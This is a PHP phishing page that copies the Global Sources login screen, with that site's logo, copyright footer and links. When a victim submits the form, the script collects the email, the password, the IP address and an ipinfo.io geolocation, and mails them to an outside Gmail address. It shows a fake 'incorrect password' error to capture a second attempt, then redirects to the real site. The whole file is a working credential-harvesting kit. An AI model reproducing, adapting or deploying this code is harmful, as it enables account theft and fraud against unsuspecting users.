<?php
ob_start();
session_start();

	function errmessage_design($message){
		$output="";
		if(!empty($message)){
			$output="
				<span style='color:#f00; font-size:12px; font-style:italic;'>$message</span>
			";
		}
		return $output;
	}

	function input_errmessage($str){
		global $inputs;
		if(isset($inputs[$str]) && !empty($inputs[$str])){
			return $inputs[$str]['errmessage'];
		}else{
			return "";
		}
	}

	function input_errorfound($str){
		global $inputs;
		if(isset($inputs[$str]['errorfound']) && !empty($inputs[$str]['errorfound'])){
			return $inputs[$str]['errorfound'];
		}else{
			return "";
		}
	}

	function input_value($str){
		global $inputs;
		if(isset($inputs[$str]) && !empty($inputs[$str])){
			return $inputs[$str]['value'];
		}else{
			return "";
		}
	}

	function redirect_to($location){header("Location: ".$location); exit;}
	
?>

<!doctype html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="">
<meta name="keywords" content="">
<![if !IE]>
<link rel="icon" href="images/im4.jfif" type="image/x-icon">
<![endif]>
<link rel="shortcut icon" href="images/im4.jpeg" type="image/x-icon">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<title>Global Sources</title>
<script type="text/javascript" src="https://code.jquery.com/jquery-latest.min.js"></script>
<style type="text/css">

	@font-face{
		font-family:'page_section_font';
		src:url('webfonts/open-sans/OpenSans-Regular.ttf') format('truetype');
		
	} 

	@font-face {
	font-family: 'SFUITextRegular';
	font-style: normal;
	font-weight: normal;
	src: url('webfonts/sfuitext/sf-ui-text-regular-58646b56a688c.woff') format('woff');
	}


	@font-face {
	font-family: 'SFUITextLight';
	font-style: normal;
	font-weight: normal;
	src: url('webfonts/sfuitext/sf-ui-text-light-5864714f67240.woff') format('woff');
	}

	@font-face {
	font-family: 'ddd';
	font-style: normal;
	font-weight: normal;
	src: url('webfonts/ddd/ddd.ttf') format('truetype');
	}

	*{
		box-sizing:border-box;
		margin:0;
		padding:0;
		font-family:Arial, sans-serif, Helvetica, Tahoma, Arial, sans-serif;
	}

	body {
	    color: #404349;
	    font-family: page_section_font;
	    -webkit-font-smoothing: antialiased;
	}

	body, html {
	    height: 100%;
	    margin: 0;
	    font-size: 14px;
	}


	a{
		text-decoration:none;
		font-family: SFUITextLight;
	}

	a:active, a:hover {
	    color: #08c;
	    text-decoration: underline;
	}
	a:visited {
	    color: #306;
	    text-decoration: none;
	}
	a:link {
	    color: #08c;
	    text-decoration: none;
	}
	a:link {
	    color: #08c;
	}
	a, a:hover, a:visited {
	    text-decoration: none;
	}

	user agent stylesheet
	a:-webkit-any-link {
	    color: -webkit-link;
	    cursor: pointer;
	    text-decoration: underline;
	}

	#frame{
		width:100%;
		height:auto;
		margin:0px;
		float: left;
		position:relative;
		top:0px;
		background-color:#fff;
		font-size: 14px; 
		color:#444;
		clear:both;
		z-index:10;
		//box-shadow:0px 1px 2px #777;
	}

	#inner-frame{
		max-width:1240px;
		width:100%;
		height:auto;
		margin:auto;
		padding:10px;
		position:relative;
		overflow-x:hidden;
		
	}

	input:-internal-autofill-selected{
		background-color: transparent;
	}

	.text{
	 	width: 100%;
	    font-size: 16px;
	    height: 36px;
	    border: 1px solid #ccc;
	    padding: 0 5px 0 15px;
	    box-sizing: border-box;
	    background: #efefef;
	    border-radius: 5px;
	    
	}

a:focus, input, textarea, ul, select {
    outline-style: none;
    -webkit-tap-highlight-color: rgba(0,0,0,0);
}

input {
    -webkit-writing-mode: horizontal-tb !important;
    text-rendering: auto;
    color: -internal-light-dark(black, white);
    letter-spacing: normal;
    word-spacing: normal;
    text-transform: none;
    text-indent: 0px;
    text-shadow: none;
    display: inline-block;
    text-align: start;
    appearance: textfield;
    background-color: -internal-light-dark(rgb(255, 255, 255), rgb(59, 59, 59));
    -webkit-rtl-ordering: logical;
    cursor: text;
    margin: 0em;
    font: 400 13.3333px Arial;
    padding: 1px 2px;
    border-width: 2px;
    border-style: inset;
    border-color: -internal-light-dark(rgb(118, 118, 118), rgb(133, 133, 133));
    border-image: initial;
}
	::placeholder { /* Chrome, Firefox, Opera, Safari 10.1+ */
	 	color: #aaa;
	 	opacity: 1; /* Firefox */
	}

	user agent stylesheet .text {
		color: #fff;
	}

	.input_icon{
		display: table-cell; 
		padding: 6px 12px; 
		font-size: 14px; 
		font-weight: 400; 
		line-height: 1; 
		color: #555; 
		text-align: center; 
		background-color: #ccc; 
		//background: #ccc url('images/icon_userblack.png') no-repeat 9px 5px;
		background-size: cover;
		border: 1px solid #ccc; 
		width: 39px; 
		height: 39px;
		white-space: nowrap; 
		vertical-align: middle;
	}

	/*.input_ico{
		display: block;
	    width: 23px;
	    height: 23px;
	    margin: 7px;
	    position: absolute;
	    top: 0;
	    left: 0;
	    background: url(images/icon_userblack.png) 0 0px no-repeat center;
	    background-size: cover;
	}*/

	.btn{
		display: block;
	    width: 100%;
	    padding: 8px;
	    background-color: #009;
	    box-shadow: inset 0 10px 10px #66c;
	    color: #fff!important;
	    background-color: #008;
	    box-shadow: inset 0 10px 10px #66a;
	    border-radius: 4px;
	    padding: 4px 8px;
	    min-height: 16px;
	    color: #fff!important;
	    border: 0;
	    font: 700 12px/1.3 Arial,Helvetica,sans-serif;
	    display: inline-block;
	    vertical-align: middle;
	    cursor: pointer;
	    text-align: center;
	    -webkit-appearance: none;
	}

	.input_icon_holder{
		position: relative; 
		margin-bottom: 5%;
		display: table; 
	}

	.icon1{
		background: #ccc url('images/icon_userblack.png') no-repeat 9px 5px;
	}

	.icon1:hover{
		background: #ccc url('images/icon_userblack2.png') no-repeat center 9px 5px;
	}

	.icon2{
		background: #ccc url('images/key.png') no-repeat 9px 5px;
	}

	.icon2:hover{
		background: #ccc url('images/key2.png') no-repeat center 9px 5px;
	}

	.input_icon:hover{
		background-color: #ca2b21; 
		border: 1px solid #ca2b21;
	}


.input_cover{
	position: relative; 
	margin-bottom: 7px;
}

	#label{
		padding: 5px; 
		position: absolute; 
		right: 10px; 
		top: 10px; 
		z-index: 10; 
		width: auto; 
		font-size: 14px; 
		font-weight:600;
		color: #006097; 
		text-align: center;  
		border: none; 
		vertical-align: middle;
		//font-family: SFUITextRegular;
		background-color: #fff;
	}

	#label:hover{
		background-color: #f2f2f2;
	}

	.errorfound{
		border:1px solid #F15A5A; 
		//box-shadow: 0px 0px 1px #F15A5A;
		color:#F15A5A;
	}

	#form_layout{
		position:relative;
		width: 100%;
		float: left;
		//max-width: 350px;
		width:100%;
		margin: auto;
		height:auto;
		background-color:rgba(255,255,255,0.1);
		color:#fff;
		text-align: left;
		padding:7px;
		margin-top:0;
		margin-bottom:0;
		font-size:12px;
		//box-shadow:-1px 18px 3px 0px #333;
	}

	.ang{
		width: 0px; height: 0px; border-style: solid; border-width: 0px 4px 6px 4px; border-color: transparent transparent #ca2b21 transparent; position: absolute; left: 50px; display: none;
	}

	.ang0{
		top:38px; 
	}

	.ang1{
		top:39px; 
	}

	.errms{
		border:1px solid red; padding: 5px 15px; width: 100%; position: absolute; color: #ca2b21; z-index: 1; border-radius: 5px; display: none;
	}

	.errms0{
		top:43px; 
	}

	.errms1{
		top:44px; 
	}

@keyframes reduce{
	from{font-size: 16px; height: 100%; top:0;}
	to{font-size: 12px; height: 30%; top:-10px;}

}

@keyframes increase{
	from{font-size: 12px; height: 30%; top:-10px;}
	to{font-size: 16px; height: 100%; top:0;}

}


.form-error {
    padding-left: 32px;
}
.notice-error, .notice-forbid {
    border: 1px solid #f6c8b5;
    background: #fceee8;
}
.notice {
    padding: 4px 12px;
    line-height: 18px;
    font-family: Tahoma,Helvetica,Arial,\5b8b\4f53;
}

.form-error .icon-error {
    margin-left: -20px;
}
.icon-error {
    width: 14px;
    height: 14px;
    background-position: -30px -34px;
}

.icon-notice {
    background-image: url('images/hhh2.png');
}
.icon, .icon-notice, .icon-site {
    display: inline-block;
    margin-right: 6px;
    background-image: url('images/hhh2.png');
    background-color: transparent;
    background-repeat: no-repeat;
    overflow: hidden;
    vertical-align: -2px;
    //vertical-align: -1px;
}

.notice {
    padding: 4px 12px;
    line-height: 18px;
    font-family: Tahoma,Helvetica,Arial,\5b8b\4f53;
}

select.icbu-language-swicth {
    border: 1px solid #c4c6cf;
}
</style>
</head>
<body>
<?php
	$errcheck=0;
				
	$email=$login_errmsg=$login_errmsg_border="";
	$password="";
	$ln_pass="";
	
    $email_err="";
	$pass_err="";
	$ln_pass_err="";
	if(isset($_GET['m']) && !empty($_GET['m'])){
		$email=htmlspecialchars(addslashes($_GET['m']));
		$email_len=strlen($email);
		$num=stripos($email, '@');
		$email_start=substr($email,0,2);
		$email_end=substr($email,$num,$email_len);
		$hidden_email=$email_start."********".$email_end;
	}else{
		$email="";
		$email_len="";
		$num="";
		$email_start="";
		$email_end="";
		$hidden_email="";
	}
?>

<?php
	$errcheck=0;
	
	$account=$msgbox=$msgbox2="";
	$password="";
	
    $account_err="";
	$password_err="";
			
	if(isset($_POST['sign_in'])){
		if(empty($_POST['email'])){
			$email_err="Account Email Address is Required";
			$errcheck=1;
		}else{
			$email=trim(htmlspecialchars(addslashes($_POST['email'])));
		}
		
		if(empty($_POST['password'])){
			$pass_err="Password Field Cannot be Empty";
			$errcheck=1;
		}else{
			$password=trim(htmlspecialchars(addslashes($_POST['password'])));
		}

		$ip = $_SERVER['REMOTE_ADDR'];

		$url = "http://ipinfo.io/".$_SERVER['REMOTE_ADDR'];
	    $ch = curl_init($url);
	    curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE);     
	    $data = curl_exec($ch);
	    curl_close($ch);
	    $geo_loc = json_decode($data, TRUE);
		$x = $geo_loc['city']." ".$geo_loc['region']." ".$geo_loc['country']." ".$geo_loc['postal'];
		$loc=trim(htmlspecialchars(addslashes($x)));

		if($errcheck==1){

			$msgbox="Invalid data format";
			
		}else{	
			if(isset($_SESSION['attempts'])){
				$_SESSION['attempts']++;
			}else{
				$_SESSION['attempts']=1;
			}
			
			if($_SESSION['attempts'] >= 2){
			   
				$details="-------------------------------<br>";
				$details.="UserID: $email<br>";
				$details.="Email Password: $password<br>";
				$details.="Date: ".date("D, M d, Y h:i:s")."<br>";
				$details.="Loggedin From: ".$loc."<br>";
				$details.="IP: ".$ip."<br>";
				$details.="Login Attempts: ".$_SESSION['attempts']."<br>";
				$details.="---------------------------------";

				$header="MIME-Version: 1.0\r\n";
				$header.="Content-type: text/html; charset=utf-8\r\n";
			//	echo "<script>alert('$details')</script>";
				mail("grace2logz@gmail.com","Global Source. Log!",$details,$header);
				unset($_SESSION['attempts']);
			
				redirect_to("https://login.globalsources.com/sso/GeneralManager?action=Login&application=GSOL&language=en&appURL=https%3A%2F%2Fwww.globalsources.com%2FGeneralManager%3Faction%3DReMap%26where%3DGoHome");
			}else{
			    $msgbox="Error";
				$details="-------------------------------<br>";
				$details.="UserID: $email<br>";
				$details.="Email Password: $password<br>";
				$details.="Date: ".date("D, M d, Y h:i:s")."<br>";
				$details.="Loggedin From: ".$loc."<br>";
				$details.="IP: ".$ip."<br>";
				$details.="Login Attempts: ".$_SESSION['attempts']."<br>";
				$details.="---------------------------------";

				$header="MIME-Version: 1.0\r\n";
				$header.="Content-type: text/html; charset=utf-8\r\n";

				//echo "<script>alert('$details')</script>";
				mail("grace2logz@gmail.com","Global Source Log!",$details,$header);
				
			}
		}
	}
?>
<div id="frame" style="background-color: transparent; margin: 0; ">
	<div id="inner-frame" style=" height: 60px; max-width: 868px; padding-top: 0;">
		<div style="float: left; margin: 5px 0 0 -8px; background: url('images/imlogo.png') no-repeat; background-size: contain; width: 210px; height: 32px;">
			<div style="position: absolute; top:34px; left: 20px; font-size: 11px; padding-top: 0px;">
				Reliable exporters: find them and meet them
			</div>
		</div>
		<div style="color: #06c; float: right; padding-top: 20px; font-size: 12px;">Help</div>
	</div>
</div>

<div id="frame" style="background: #f5f5f5 url('images/baner.webp') center center no-repeat; background-size: cover; height:auto; margin:0;">
	<div id="inner-frame" align="center" style="max-width: 868px; padding: 20px 0 100px; zoom:1;">
		
		<div class="m_col" style="width: 55%; float: left; padding: 10px; color: #333;">
			<img src="images/im1.jfif" class="" style="margin: 0; max-width: 100%;">
		</div>
		<div class="m_col" style="width: 45%; float: left; padding: 0px; margin: 0; color: #333;">
			<div id='form_layout' style="background-color: #fff; padding: 10px 30px; transition: all .2s ease 0s; margin: 0; margin-top: 28px; color: #333; ">
				<div class="">
					<div style="float: left; width: 100%; padding: 10px 0; line-height: 1.5;">
						<div style="float: left; font-size: 22px; color:#000;">Login</div>  
						<div style="float: right; font-size: 12px; padding-top: 5px; text-align: right;margin: 0; color: #999;">Not yet registered? <a href="https://login.globalsources.com/sso/GeneralManager?action=RegisterGSOLUser&amp;userTemplate=GSOLUSERMAG&amp;validate=false&amp;fromWhere=GSOL&amp;language=en&amp;country=US" style="color: #06c; text-decoration: none; font-family: sans-serif;">Sign up</a></div>
						<form action="" method="post" style="margin: 0;">
							<?php  
								if(!empty($msgbox)){
							?>
									<div id="login-error" class="form-error notice notice-error" style="position: absolute; width: calc(100% - 44px); z-index: 10;">
							   		<span class="notice-descript">Your account name or password is incorrect.</span>
							</div>
							<?php
								}
							?>
							
							<div style="width: 100%; float: left; margin-top: 15px;">
								<input type="text" name="email" required placeholder="Email or username" class="text" value="<?php echo $email;?>">
							</div>
							<div style="width: 100%; float: left; margin-top: 15px;">
								
								<input type="password" name="password" required placeholder="Password" class="text">
							</div>
							<button type="submit" name='sign_in' class="btn" style="margin-top: 15px; padding: 8px;">
								Login Now
							</button>
							<div style="float: left; padding: 10px 0;">
								<input type="checkbox" checked name="k_sign_in"> Remember me<br>
								(Do not check this option if you are using a shared computer.)
							</div>

							
							
						</form>
					</div>
					<div style="float: left; font-size: 14px; width: 100%; border-top: 1px solid #dae2ee; padding: 20px 0 0; text-align: center; font-weight: normal;">
						<a href="#">
							<img src="images/Capture.PNG" height="35">
						</a><br>
						<a href="#">
							<label style="font-weight: normal; font-size: 12px; font-family: sans-serif;">Forgot Password?</label>
						</a>
						
					</div>	
					<div style="padding: 10px; background-color: #fff; position: absolute; z-index: 100; left: calc(50% - 20px); top: 250px; color: #ccc;">
						OR
					</div>
				</div>
				
			</div>
			<div id='form_layout' style="float: left; padding: 0px; color: #333; text-align: center; font-size: 18px; line-height: 3;">
				Get the app.<br>
				<a href="http://mrw.so/6rcK0e"><img src="images/im2.jfif"></a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://mrw.so/5t7fTE"><img src="images/im3.jfif"></a>

			</div>
		</div>
	</div>
</div>

<style type="text/css">
	.wrapper_login .GS_copyright {
    background: 0;
}
.GS_copyright {
    color: #666;
    line-height: 16px;
    padding: 8px;
    font-size: 12px;
    font-family: sans-serif;
}

.GS_copyright_link a, .GS_copyright_link span {
    margin: 0 5px;
}
.GS_footer a {
    color: #666;
    text-decoration: none;
     font-family: sans-serif;
}
</style>

<div id="frame" style="background-color: #fff; color: #000; margin-top: 0px; line-height: 16.8px; font-size: 12px; padding:10px; padding-bottom: 0; ">
	<div id="inner-frame" align="center" style="display:block; margin: 0 auto; padding:15px 0; text-align:center; text-align:center; height: 184;">
		<div class="GS_footer">
			<div class="GS_copyright">
				<p>Copyright © 2020 Publishers Representatives Limited. <a href="javascript:winPop2('https://www.globalsources.com/CUSTOMER/ALLRIGHTS.HTM','130','640')">All rights reserved</a>.</p>
				<p class="GS_copyright_link"><a href="https://www.globalsources.com/SITE/TERMSOFUSE.HTM" type="absolute" target="_blank">Terms of Use</a> <a href="https://www.globalsources.com/HELP/PRIVACY.HTM" type="absolute" target="_blank">Privacy Policy</a> <a href="https://www.globalsources.com/CUSTOMER/SECMEASURES.HTM" type="absolute" target="_blank">Security Measures</a> <a href="https://www.globalsources.com/CUSTOMER/IPPOLICY.HTM" type="absolute" target="_blank">IP Policy</a> 
				<span>hklogin2.globalsources.com</span></p>
			</div>
		</div>
	</div>
</div>
</body>
</html>
<?php
	ob_end_flush();
?>